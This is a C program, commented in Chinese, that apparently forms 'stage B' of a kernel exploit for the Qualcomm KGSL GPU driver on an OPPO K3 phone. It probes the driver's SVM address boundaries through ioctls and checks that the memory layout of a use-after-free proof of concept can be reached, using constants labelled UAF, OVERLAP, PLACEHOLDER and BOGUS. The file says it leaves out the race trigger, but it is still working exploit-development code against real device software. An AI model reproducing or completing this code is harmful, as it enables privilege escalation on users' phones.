/*
 * k3_stage_b.c — OPPO K3 KGSL 阶段 B：SVM 边界标定 + 四段 range 几何复现
 *
 * 对应交接文档 §14.5 阶段 B。全部为无害操作：
 *   - 不调用 MAP_USER_MEM(BOGUS/WRAP_SIZE)，不进入竞态路径
 *   - 仅做 alloc / mmap(FIXED) / munmap / free 与只读边界探测
 *
 * 依据：src_ref/kgsl_4.9/kgsl_iommu.h
 *   KGSL_IOMMU_SVM_BASE64 = 0x700000000, KGSL_IOMMU_SVM_END64 = 0x800000000
 *   KGSL_IOMMU_VA_BASE64  = 0x500000000, KGSL_IOMMU_VA_END64  = 0x600000000
 *   KGSL_IOMMU_SVM_BASE32 = 0x300000,    KGSL_IOMMU_SVM_END32 = 0xC0000000-16M
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define PAGE 4096

struct kgsl_drawctxt_create {
	unsigned int flags;
	unsigned int drawctxt_id;
};

struct kgsl_map_user_mem {
	int fd;
	unsigned long gpuaddr;
	uint64_t len;
	uint64_t offset;
	unsigned long hostptr;
	int memtype;
	unsigned int flags;
};

struct kgsl_gpuobj_alloc {
	uint64_t size;
	uint64_t flags;
	uint64_t va_len;
	uint64_t mmapsize;
	unsigned int id;
	unsigned int metadata_len;
	uint64_t metadata;
};

struct kgsl_gpuobj_free {
	uint64_t flags;
	uint64_t priv;
	unsigned int id;
	unsigned int type;
	unsigned int len;
};

struct kgsl_gpuobj_info {
	uint64_t gpuaddr;
	uint64_t flags;
	uint64_t size;
	uint64_t va_len;
	uint64_t va_addr;
	unsigned int id;
};

#define IOCTL_KGSL_DRAWCTXT_CREATE \
	_IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_MAP_USER_MEM \
	_IOWR(KGSL_IOC_TYPE, 0x15, struct kgsl_map_user_mem)
#define IOCTL_KGSL_GPUOBJ_ALLOC \
	_IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPUOBJ_FREE \
	_IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)
#define IOCTL_KGSL_GPUOBJ_INFO \
	_IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ULL
#define KGSL_USER_MEM_TYPE_ADDR   0x00000002
#define KGSL_CONTEXT_PREAMBLE     0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002

/* PoC 常量（§14.3 / src_ref/poc_ex.c） */
#define UAF_START  0x00000007001ff000ULL
#define UAF_SIZE   0x0000000010004000ULL
#define OVERLAP_START 0x00000007001fe000ULL
#define OVERLAP_SIZE  0x0000000000007000ULL
#define PLACEH_START  0x0000000710204000ULL
#define PLACEH_SIZE   0x0000000000010000ULL
#define BOGUS_START   0x0000000700204000ULL

static int g_fd = -1;
static int g_fail = 0;

static void hdr(const char *s) { printf("\n== %s ==\n", s); fflush(stdout); }

static void ko(const char *tag, const char *detail)
{
	printf("  %-34s OK   %s\n", tag, detail ? detail : "");
	fflush(stdout);
}

static void kf(const char *tag, int err)
{
	g_fail++;
	printf("  %-34s FAIL errno=%d (%s)\n", tag, err, strerror(err));
	fflush(stdout);
}

/* ---------- 1. drawctxt ---------- */
static void step_drawctxt(void)
{
	struct kgsl_drawctxt_create dc;
	unsigned int flags;
	int ret, err;
	char buf[64];

	hdr("1  DRAWCTXT_CREATE (需要 PREAMBLE|NO_GMEM_ALLOC)");
	flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC;
	memset(&dc, 0, sizeof(dc));
	dc.flags = flags;
	errno = 0;
	ret = ioctl(g_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &dc);
	err = errno;
	if (ret == 0) {
		snprintf(buf, sizeof(buf), "flags=0x%x id=%u", flags,
			 dc.drawctxt_id);
		ko("DRAWCTXT_CREATE(0x12)", buf);
	} else {
		kf("DRAWCTXT_CREATE(0x12)", err);
	}
}

/* ---------- 2. SVM 边界 ---------- */
struct probe_rec { uint64_t addr; const char *note; };

static void step_boundary(void)
{
	struct probe_rec probes[] = {
		{0x00000006fffff000ULL, "SVM64 base - 4K"},
		{0x0000000700000000ULL, "SVM64 base"},
		{0x0000000700001000ULL, "SVM64 base + 4K"},
		{0x00000007fffff000ULL, "SVM64 end - 4K"},
		{0x0000000800000000ULL, "SVM64 end"},
		{0x0000000500000000ULL, "GLOBAL VA base (应拒)"},
		{0x0000000010000000ULL, "非任何区间 (应拒)"},
		{0x0000000000300000ULL, "SVM32 base"},
		{0x00000000bef00000ULL, "SVM32 end - 4M"},
	};
	unsigned int i;
	int ret, err;

	hdr("2  SVM 区间边界（MAP_USER_MEM + USE_CPU_MAP，逐个 4KB）");
	printf("  %-18s %-22s %s\n", "addr", "note", "result");
	for (i = 0; i < sizeof(probes) / sizeof(probes[0]); i++) {
		struct kgsl_map_user_mem m;
		void *p;

		p = mmap((void *)(uintptr_t)probes[i].addr, PAGE,
			 PROT_READ | PROT_WRITE,
			 MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
		if (p == MAP_FAILED) {
			printf("  0x%011llx  %-22s vma_fail(%d)\n",
			       (unsigned long long)probes[i].addr,
			       probes[i].note, errno);
			continue;
		}
		memset(&m, 0, sizeof(m));
		m.fd = -1;
		m.len = PAGE;
		m.hostptr = (unsigned long)(uintptr_t)p;
		m.memtype = KGSL_USER_MEM_TYPE_ADDR;
		m.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
		errno = 0;
		ret = ioctl(g_fd, IOCTL_KGSL_MAP_USER_MEM, &m);
		err = errno;
		if (ret == 0)
			printf("  0x%011llx  %-22s ACCEPT gpuaddr=0x%lx\n",
			       (unsigned long long)probes[i].addr,
			       probes[i].note, m.gpuaddr);
		else
			printf("  0x%011llx  %-22s REJECT errno=%d (%s)\n",
			       (unsigned long long)probes[i].addr,
			       probes[i].note, err, strerror(err));
		munmap(p, PAGE);
	}
}

/* ---------- 3. 几何可行性（匿名 VMA） ---------- */
static void step_geometry_vma(void)
{
	struct probe_rec recs[] = {
		{OVERLAP_START, "OVERLAP 0x7000"},
		{UAF_START, "UAF 0x10004000"},
		{BOGUS_START, "BOGUS 3 pages"},
		{PLACEH_START, "PLACEHOLDER 0x10000"},
	};
	unsigned int i;

	hdr("3  四段 range 的地址空间可达性（仅匿名 VMA，不分配 GPU 内存）");
	for (i = 0; i < 4; i++) {
		size_t len = (i == 0) ? OVERLAP_SIZE :
			     (i == 1) ? 0x2000000 /* 32MB 抽样 */ :
			     (i == 2) ? PAGE * 3 : PLACEH_SIZE;
		void *p = mmap((void *)(uintptr_t)recs[i].addr, len,
			       PROT_READ | PROT_WRITE,
			       MAP_SHARED | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
		if (p == MAP_FAILED) {
			kf(recs[i].note, errno);
			continue;
		}
		*(volatile char *)p = 0x11;
		ko(recs[i].note, "vma ok");
		munmap(p, len);
	}
}

/* ---------- 4. gpuobj 几何流程（缩小版） ---------- */
static int alloc_obj(uint64_t size, unsigned int *id, uint64_t *mmapsize)
{
	struct kgsl_gpuobj_alloc al;
	int ret, err;

	memset(&al, 0, sizeof(al));
	al.size = size;
	al.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
	al.va_len = 0;
	errno = 0;
	ret = ioctl(g_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &al);
	err = errno;
	if (ret) {
		kf("GPUOBJ_ALLOC", err);
		return -1;
	}
	*id = al.id;
	*mmapsize = al.mmapsize;
	return 0;
}

static void free_obj(unsigned int id)
{
	struct kgsl_gpuobj_free fr;
	int ret;

	memset(&fr, 0, sizeof(fr));
	fr.id = id;
	errno = 0;
	ret = ioctl(g_fd, IOCTL_KGSL_GPUOBJ_FREE, &fr);
	if (ret)
		kf("GPUOBJ_FREE", errno);
}

static void info_obj(unsigned int id, const char *tag)
{
	struct kgsl_gpuobj_info inf;
	int ret;

	memset(&inf, 0, sizeof(inf));
	inf.id = id;
	errno = 0;
	ret = ioctl(g_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
	if (ret) {
		kf(tag, errno);
		return;
	}
	printf("  %-34s gpuaddr=0x%llx va_addr=0x%llx size=0x%llx "
	       "va_len=0x%llx\n", tag,
	       (unsigned long long)inf.gpuaddr,
	       (unsigned long long)inf.va_addr,
	       (unsigned long long)inf.size,
	       (unsigned long long)inf.va_len);
	fflush(stdout);
}

static void step_geometry_gpuobj(void)
{
	unsigned int uaf_id = 0, ov_id = 0, ph_id = 0;
	uint64_t uaf_ms = 0, ov_ms = 0, ph_ms = 0;
	uint64_t scaled_uaf = 0x2000000; /* 32MB：先验流程，再试满尺寸 */
	void *p;
	char buf[96];

	hdr("4  gpuobj 几何流程（UAF 用 32MB 缩放版）");

	if (alloc_obj(scaled_uaf, &uaf_id, &uaf_ms))
		return;
	snprintf(buf, sizeof(buf), "id=%u mmapsize=0x%llx", uaf_id,
		 (unsigned long long)uaf_ms);
	ko("GPUOBJ_ALLOC(UAF 32MB)", buf);

	if (alloc_obj(OVERLAP_SIZE, &ov_id, &ov_ms))
		return;
	snprintf(buf, sizeof(buf), "id=%u mmapsize=0x%llx", ov_id,
		 (unsigned long long)ov_ms);
	ko("GPUOBJ_ALLOC(OVERLAP)", buf);

	p = mmap((void *)(uintptr_t)UAF_START, (size_t)uaf_ms,
		 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, g_fd,
		 (off_t)uaf_id << 12);
	if (p == MAP_FAILED || (uint64_t)(uintptr_t)p != UAF_START) {
		kf("mmap(UAF @0x7001ff000)", errno);
		free_obj(uaf_id);
		free_obj(ov_id);
		return;
	}
	ko("mmap(UAF @0x7001ff000)", "fixed ok");
	info_obj(uaf_id, "GPUOBJ_INFO(UAF after mmap)");

	/* 只触碰首页与末页，避免 32MB 实触压力 */
	((volatile char *)p)[0] = 0x5a;
	((volatile char *)p)[(size_t)uaf_ms - PAGE] = 0x5a;
	ko("touch UAF first/last page", "ok");

	munmap(p, (size_t)uaf_ms);
	ko("munmap(UAF)", "rbtree/PTE 保留（预期）");

	p = mmap((void *)(uintptr_t)OVERLAP_START, (size_t)ov_ms,
		 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, g_fd,
		 (off_t)ov_id << 12);
	if (p == MAP_FAILED || (uint64_t)(uintptr_t)p != OVERLAP_START)
		kf("mmap(OVERLAP @0x7001fe000)", errno);
	else {
		ko("mmap(OVERLAP @0x7001fe000)", "fixed ok");
		((volatile char *)p)[0] = 0x5a;
		munmap(p, (size_t)ov_ms);
	}

	if (alloc_obj(PLACEH_SIZE, &ph_id, &ph_ms) == 0) {
		p = mmap((void *)(uintptr_t)PLACEH_START, (size_t)ph_ms,
			 PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, g_fd,
			 (off_t)ph_id << 12);
		if (p == MAP_FAILED || (uint64_t)(uintptr_t)p != PLACEH_START)
			kf("mmap(PLACEHOLDER @0x710204000)", errno);
		else {
			ko("mmap(PLACEHOLDER @0x710204000)", "fixed ok");
			((volatile char *)p)[0] = 0x5a;
			munmap(p, (size_t)ph_ms);
		}
		free_obj(ph_id);
	}
	free_obj(ov_id);
	free_obj(uaf_id);
}

int main(void)
{
	printf("k3_stage_b | pid=%d uid=%d\n", getpid(), getuid());

	g_fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
	if (g_fd < 0) {
		printf("open /dev/kgsl-3d0 FAIL errno=%d (%s)\n", errno,
		       strerror(errno));
		return 1;
	}
	ko("open /dev/kgsl-3d0", "");

	step_drawctxt();
	step_boundary();
	step_geometry_vma();
	step_geometry_gpuobj();

	printf("\nsummary: failures=%d\n", g_fail);
	close(g_fd);
	return g_fail ? 2 : 0;
}
